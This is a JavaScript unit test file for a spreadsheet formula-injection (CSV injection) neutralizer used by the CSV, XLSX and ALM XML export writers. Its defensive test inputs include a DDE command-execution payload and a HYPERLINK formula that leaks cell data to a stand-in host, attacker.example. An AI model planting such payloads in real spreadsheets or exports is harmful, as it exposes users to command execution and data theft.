import assert from "node:assert/strict";
import test from "node:test";

import { neutralizeFormulaLeading } from "./spreadsheet-formula-guard.js";

// Issue #1664 (audit-2026-05) follow-up: the formula-injection neutralizer is
// the single source of truth used by qc-csv-writer, qc-xlsx-writer, and
// qc-alm-xml-writer. These tests pin the contract directly so any future
// regression in the writers (e.g., one writer importing from the wrong place)
// fails here loudly instead of leaking through three near-identical copies.

test("neutralizeFormulaLeading: prefixes the OWASP CWE-1236 leader characters", () => {
  for (const offender of [
    "=cmd|'/c calc'!A1",
    `=HYPERLINK("https://attacker.example/?"&A1, "Click")`,
    "+1+1+cmd",
    "-2*A1",
    "@SUM(A1:A2)",
    "\tinjected",
    "\rinjected",
  ]) {
    const out = neutralizeFormulaLeading(offender);
    assert.ok(
      out.startsWith("'"),
      `expected leading apostrophe for "${offender}", got "${out}"`,
    );
    assert.equal(
      out.slice(1),
      offender,
      "neutralizer must preserve the original payload after the apostrophe",
    );
  }
});

test("neutralizeFormulaLeading: leaves benign values byte-for-byte intact", () => {
  for (const value of [
    "Verify the user can submit the form.",
    "Step 1: enter IBAN",
    " - leading space then dash",
    "1+1=2 in the middle",
    "",
  ]) {
    assert.equal(neutralizeFormulaLeading(value), value);
  }
});

test("neutralizeFormulaLeading: is idempotent — applying twice equals applying once", () => {
  const offender = "=danger";
  const once = neutralizeFormulaLeading(offender);
  const twice = neutralizeFormulaLeading(once);
  assert.equal(once, "'=danger");
  assert.equal(twice, "'=danger");
});

test("neutralizeFormulaLeading: empty string returns empty string", () => {
  assert.equal(neutralizeFormulaLeading(""), "");
});

test("neutralizeFormulaLeading: only the FIRST character is treated as a leader", () => {
  // Mid-string leaders must NOT be re-anchored — they are benign once the
  // first character is non-leader (Excel does not interpret them as
  // formulas).
  for (const benign of ["a=b", "Step + 1", "x@y", "x-y", "x\ty", "x\ry"]) {
    assert.equal(neutralizeFormulaLeading(benign), benign);
  }
});
